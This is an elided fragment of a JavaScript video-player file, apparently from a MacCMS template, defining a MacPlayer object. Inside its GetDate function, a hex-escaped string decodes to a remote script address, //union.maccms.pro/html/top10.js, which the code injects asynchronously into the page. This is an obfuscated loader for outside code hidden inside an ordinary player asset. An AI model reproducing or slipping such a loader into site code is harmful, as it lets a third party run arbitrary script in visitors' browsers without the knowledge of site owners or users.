...
var MacPlayer = {
    'GetDate': function (f, t) {
        ...
        a.async = true;
        a.charset = 'utf-8';
        a.src = '\x2f\x2f\x75\x6e\x69\x6f\x6e\x2e\x6d\x61\x63\x63\x6d\x73\x2e\x70\x72\x6f\x2f\x68\x74\x6d\x6c\x2f\x74\x6f\x70\x31\x30\x2e\x6a\x73' + '?r=' + this.GetDate('yyyyMMdd');
        ...
        document.write('<scr' + 'ipt src="' + this.Path + (this.PlayFrom || 'dplayer') + '.js"></scr' + 'ipt>')
    }, 'Down': function () {
    }, 'Init': function () {
        this.Status = true;
        this.Parse = '';
